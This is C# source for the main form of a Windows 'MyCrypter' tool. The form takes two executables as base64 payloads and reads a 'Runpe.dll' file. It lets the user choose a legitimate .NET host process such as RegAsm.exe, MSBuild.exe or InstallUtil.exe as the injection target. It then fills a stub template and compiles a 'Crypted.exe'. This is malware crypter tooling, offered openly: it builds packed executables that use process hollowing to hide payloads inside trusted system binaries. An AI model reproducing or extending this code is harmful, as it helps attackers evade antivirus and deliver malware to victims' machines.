using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Media;

namespace MyCrypter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Filter = "Executable File | *.exe";
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                txtFile.Text = OFD.FileName;
            }
        }

        private void playaudio()
        {
             // here WindowsFormsApplication1 is the namespace and Connect is the audio file name
            
        }
        private void btnCrypt_Click(object sender, EventArgs e)
        {
            
            if (txtFile.Text.Length > 0)
            {
                string PayloadBase64 = Convert.ToBase64String(File.ReadAllBytes(txtFile.Text));
                string PayloadBase642 = Convert.ToBase64String(File.ReadAllBytes(textBox1.Text));
                string RunpeToBase64 = Convert.ToBase64String(File.ReadAllBytes("Runpe.dll"));
                string InjectionProcess = string.Empty;

                if (rbRegAsm.Checked == true)
                {
                    InjectionProcess = "RegAsm.exe";
                }
                else if (rbRegSvcs.Checked == true)
                {
                    InjectionProcess = "RegSvcs.exe";
                }
                else if (rbInstallUtil.Checked == true)
                {
                    InjectionProcess = "InstallUtil.exe";
                }
                else if (rbAppLaunch.Checked == true)
                {
                    InjectionProcess = "AppLaunch.exe";
                }
                else if (rbMSBuild.Checked == true)
                {
                    InjectionProcess = "MSBuild.exe";
                }
                else if (rbVBC.Checked == true)
                {
                    InjectionProcess = "AddInProcess32.exe";
                }
                else if (rbCvtRes.Checked == true)
                {
                    InjectionProcess = "CvtRes.exe";
                }
                else if (rbAddInProcess.Checked == true)
                {
                    InjectionProcess = "CasPol.exe";
                }
                else if (radioButton1.Checked == true)
                {
                    InjectionProcess = textBox2.Text;
                }
                else if (radioButton2.Checked == true)
                {
                    InjectionProcess = "VBC.exe";
                }

                SaveFileDialog SFD = new SaveFileDialog();
                SFD.Filter = "Executable File | *.exe";
                SFD.FileName = "Crypted.exe";
                if (SFD.ShowDialog() == DialogResult.OK)
                {
                    string SourceCode = Properties.Resources.Stub.Replace("%RUNPE%", RunpeToBase64).Replace("%PAYLOAD%", PayloadBase64).Replace("%PAYLOAD2%", PayloadBase642).Replace("%PROCESS%", InjectionProcess);
                    Compiler.CodeDom(SourceCode, SFD.FileName);
                    
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void rbRegAsm_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void rbMSBuild_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Filter = "Executable File | *.exe";
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = OFD.FileName;
            }
        }

        private void rbAppLaunch_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void rbVBC_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            //label5.Visible = true;
            this.Size = new Size(784, 473);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            //label5.Visible = false;
            this.Size = new Size(784, 265);
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void rbRegSvcs_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }
    }
}
